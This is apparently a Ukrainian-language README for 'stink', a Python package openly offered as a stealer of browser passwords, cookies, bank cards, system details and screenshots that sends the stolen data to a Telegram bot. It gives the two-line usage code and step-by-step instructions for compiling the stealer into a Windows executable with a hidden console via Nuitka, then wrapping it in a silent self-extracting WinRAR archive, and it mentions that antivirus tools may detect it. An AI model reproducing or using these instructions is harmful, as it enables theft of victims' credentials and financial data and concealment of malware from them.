# stink

Стіллер кукі та паролів всього лише в 2 рядки. Відправлення в Telegram.

## Опис
`stink` в даний момент тільки починає свій розвиток. У майбутньому його функціонал буде розширено.

## Встановлення

Встановити останню версію можна командою:
```
pip install stink==1.0.1
```

## Приклад використання
### Стандартний
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
### Додаткові параметри

- `errors` - виведення помилок.

- `passwords` - збір паролів.

- `cookies` - збір кукі.

- `cards` - збір банківських карт.

- `processes` - збір активних процесів.

- `system` - збір конфігурації системи.

- `screen` - скріншот.

Усі параметри приймають значення `bool`.

- `True` - функція включена.

- `False` - функція виключена.

За замовчуванням увімкнено всі функції, крім виводу помилок.

## Створення exe
Python являється інтерпретованою мовою програмування, тому ми спочатку транслюємо його в C, а потім скомпілюємо в .exe файл.
Для цього нам знадобиться Nuitka.

### Створення виконуваного файла

Створюємо test.py (або будь-яку іншу назву) файл з наступним кодом:
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

### CMD
1. Відкриваємо `cmd`.
2. Прописуємо команду:
```
pip install virtualenv
```
3. Переходимо в папку з файлом `test.py`:
```
cd path\to\file
```
4. Створюємо віртуальне оточення і активуємо його:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Встановлюємо Nuitka і Stink:
```
pip install Nuitka==0.6.16.4
```
```
pip install stink==1.0.1
```
6. Прописуємо команду:
```
nuitka --onefile --windows-disable-console --include-package=stink test.py
```

Після виконання команди отримуємо test.exe файл із прихованою консоллю.

## Стиснення exe
Файл `.exe` має великий розмір, тому ми стиснемо його за допомогою WinRAR, при цьому він все ще буде мати формат `.exe`.

### Недоліки
- Може розпізнаватися деякими антивірусами.
- Більший час запуску програми.

### WinRAR

1. Cкачуємо та встановлюємо [WinRAR](https://www.win-rar.com/start.html?&L=4).
2. Натискаємо правою кнопкою по `.exe` файлу і вибираємо `Додати в архів...`.
3. Вибираємо формат архіву `RAR`, метод стиснення `Максимальний`, розмір словаря `32 МБ` і вмикаємо `Створити саморозпакувальний архів`.
4. Переходимо у вклаку `Додатково` та обираємо `Параметри SFX`.
5. Переходимо у вклаку `Встановлення` і вводимо назву вашого файлу (наприклад `test.exe`) в поле `Виконати після розпакування`.
6. Переходимо у вклаку `Режими`, вмикаємо `Розпакувати в тимасову папку` та обираємо `Сховати все` в розділі `Режим виводу інформації`.
7. Переходимо у вклаку `Оновлення`, обираємо `Перезаписувати всі файли без запиту` в розділі `Режим перезапису`.
8. Іконку та логотип змінюємо за бажанням в вкладці `Текст і графіка`.
9. Натискаємо `ОК`.

В результаті отримуємо `.exe` файл зменшений у декілька разів:
```
        File size              Ratio
------------------------    -----------
48 091 KB  ->  15 239 KB       68.3%
```
